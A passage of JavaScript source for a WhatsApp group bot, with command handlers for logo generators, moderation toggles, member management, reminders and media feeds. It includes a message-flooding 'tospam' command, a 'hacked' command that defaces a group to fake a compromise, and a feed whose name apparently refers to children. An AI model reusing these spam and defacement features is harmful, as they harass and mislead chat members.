					xeon.sendMessage(from, `*Bgm Deleted*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})}, message: { orderMessage: { itemCount: 59, status: 200, thumbnail: fs.readFileSync('./xeon.jpg'), surface: 200, message: '𝕻𝖊𝖕𝖊', orderTitle: '𝕾𝖊𝖗', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listbgm':
					case 'listvn':
					teks = '*Lɪsᴛ Bɢᴍ :*\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Tᴏᴛᴀʟ : ${vien.length}*\n\n_▢_`
					xeon.sendMessage(from, teks.trim(), extendedText, { caption: 'teks', "contextInfo": { text: 'teks', sendEphemeral: true, "externalAdReply": { "title": `${' '}𝑷𝒆𝒑𝒆 𝑺𝒆𝒓${''}${''}`, "body": ``, "previewType": 'PHOTO', "thumbnailUrl": `${'https://i.ibb.co/vkkcm0L/034c588fd8d5.jpg'}`, "thumbnail": '', "sourceUrl": `${'https://wa.me/c/62852407507130'}`}},quoted: ftext})
					break
       case 't3d':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(5)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'logoa':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack&lol*`)
                   var F = body.slice(7)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'phlogo':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack&lol*`)
                   var F = body.slice(9)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'marvel':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack&lol*`)
                   var F = body.slice(8)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'leavest':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(9)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'notewrite':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'neon2':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'wall':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?q`, quoted: mek})
                   break
      case "antilink":
        if (!isGroup) return reply("Only in groups");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isAntilink) return reply("Activated!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Successfully activate antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Successfully turn off antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Please choose one`, [
            {
              buttonId: `antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Activated!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Successfully activate antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Successfully turn off antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Please choose one`,
            [
              {
                buttonId: `antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Activated!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Successfully activate antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Successfully turn off antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Please choose one`,
            [
              {
                buttonId: `antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autotype':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Choose on or off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Success activate autotype`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Success turns off autotype`)
} else {
reply(`Choose on or off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succesfully activated autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Successfully turned off autovn`)
} else {
reply(`Select on or off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(antical)return reply('It has been activated before!')
antical = true
reply(`Succesfully activated anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('It has been deactivated before!')
antical = false
reply(`Successfully turned off anticall`)
} else {
reply(`Select on or off`)
}
break

case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succesfully activated autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Successfully turned off autoread group`)
} else {
reply(`Select on or off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succesfully activated autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Successfully turned off autoread pc`)
} else {
reply(`Select on or off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
      case "autojoin":
        if (!isGroup) return reply("Group only");
        if (!mek.key.fromMe) return reply("This feature is only for the owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Activated!!");
          autojoin = true;
          reply("Successfully activated autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Successfully turned off autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Please choose one`, [
            {
              buttonId: `autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Activated!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Successfully activated antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Successfully turned off antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Please choose one`, [
            {
              buttonId: `antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isKickarea) return reply("Activated!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully activated kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully turned off kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Please choose one`, [
            {
              buttonId: `kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >-------------------
      case 'listonline': 
if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(xeon.chats.get(ido).presences), xeon.user.jid]
             xeon.sendMessage(from, '*Online list:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
      case "sider":
        if (!m.quoted) throw `Reply to bot messages!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await xeon.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await xeon.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Read by:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} left` : ""}

*Sent to:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} left` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: xeon.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = xeon.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        if (!isGroup) return reply('this feature is only for groups');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('only admin can use this feature');
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag the target you want to kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          xeon.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          xeon.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          xeon.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
      case "add":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
			if (!isGroup) return reply('this feature is only for groups')
			if (!isGroupAdmins) return sticAdmin(from)
			if (!isBotGroupAdmins) return sticNotAdmin(from)
			if (args.length < 1) return reply('do you want to add a genie?')
					if (args[0].startsWith('08')) return reply('use the country code')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						xeon.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Failed to add target, maybe because its private🤔')
					}
					break;
case 'igstory': 
            if(!q) return reply('Username?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    xeon.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    xeon.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
case 'linkwa':
            if(!q) return reply('what group are you looking for?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Name*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await xeon.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
        //get grup desc
        case 'getdeskgc':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
				if (!isGroup) return reply('this feature is only for groups')
					anu = from
			   metadete = await xeon.groupMetadata(anu)
				xeon.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          xeon.contacts[ambl] != undefined
            ? xeon.contacts[ambl].sname || xeon.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        xeon.groupUpdateDescription(from, `${args.join(" ")}`);
        xeon.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        xeon.groupUpdateSubject(from, `${args.join(" ")}`);
        xeon.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
        if (!isGroup) return;
        ppUrl = await xeon.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        xeon.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case "demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply to the  member you wanted to promote");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        xeon.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        xeon.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        xeon.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        xeon.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "closegc":
      case "closegroup":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        xeon.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Most!')
if (!Number(oi2)) return reply('Amount must be a number!')
	  for (let i = 0; i < oi2; i++) {
	  xeon.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Amount must be a number!')
if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  xeon.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await xeon.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Amount must be a number!')
	if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  xeon.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await xeon.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Amount must be a number!')
	if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  xeon.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await xeon.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Most!')
	if (!Number(oi2)) return reply('Amount must be a number!')
	  for (let i = 0; i < oi2; i++) {
	  xeon.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	  case "revokelink":
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        xeon.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
            case "opengroup":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        xeon.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `EXAMPLE OF USE:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await xeon.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Message: ${messRemind}
➸ Type: Text
➸ Duration: ${parsedTime.hours} Hour ${parsedTime.minutes} Minute ${
              parsedTime.seconds
            } detik
➸ To: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              xeon.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Message: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xeon.downloadAndSaveMediaMessage(encmedia);
          await xeon.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Message: ${messRemind}
➸ Type: Sticker
➸ Duration: ${parsedTime.hours} Hour ${parsedTime.minutes} Minute ${
              parsedTime.seconds
            } detik
➸ To: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              xeon.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Message: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xeon.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await xeon.downloadAndSaveMediaMessage(encmedia);
          await xeon.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Message: ${messRemind}
➸ Type: Image
➸ Duration: ${parsedTime.hours} Hour ${parsedTime.minutes} Minute ${
              parsedTime.seconds
            } detik
➸ To: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Message: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              xeon.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xeon.downloadAndSaveMediaMessage(encmedia);
          await xeon.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Message: ${messRemind}
➸ Type: Audio
➸ Duration: ${parsedTime.hours} Hour ${parsedTime.minutes} Minute ${
              parsedTime.seconds
            } detik
➸ To: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              xeon.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Message: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xeon.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
case 'hacked':
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply('this feature is only for groups')
              if (args.length < 1) return reply('The text?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   xeon.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                xeon.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                xeon.groupUpdateDescription(from, `_${pushname} hacked this group_`)             
                await sleep(1000)
                xeon.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
  reply('╭─➤ *ᴘᴇᴘᴇ sɪʀ*\n│       ❑  *sᴄʀɪᴘᴛ*\n│❖   ɢɪᴛʜᴜʙ:\n│❖   https://github.com/jacksir/jack-SIR\n│❖   ʏᴏᴜᴛᴜʙᴇ:\n│❖   https://youtube.com/channel/UCVJ9029PQ-gJBtFQZZ3AJuA\n╰────────────────❋ཻུ۪۪⸙\n\n⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘\n             ᴘᴇᴘᴇ sɪʀ\n\n╭◪ *ᴄᴏᴅᴅᴇᴅ ʙʏ ᴘᴇᴘᴇ*\n╰─────────────────❋ཻུ۪۪⸙')
					break;
   case 'ss':
      reply(mess.wait)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`, `Here`)
					break
case 'harta':
  reply(mess.wait)
  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Here 🗿`)
  break
case 'leaky':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dapapi}`)
                    kodo = `Intake`
   sendButVideo(from, kodo, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `leaky`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case '+91':
                    get_result = await getBuffer(`https://xeon.herokuapp.com/api/asupan?apikey=${valkey}`)
                    pll = `Intake`
   sendButVideo(from, pll, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `+91`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'santuy':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=${dapapi}`)
                    hhh = `Intake`
   sendButVideo(from, hhh, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `santuy`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'ukhti':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=${dapapi}`)
                    kntl = `Intake`
   sendButVideo(from, kntl, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `ukhti`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'rikagusriani':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=${dapapi}`)
                    yyy = `Intake`
   sendButVideo(from, yyy, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `rikagusriani`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'ghea':
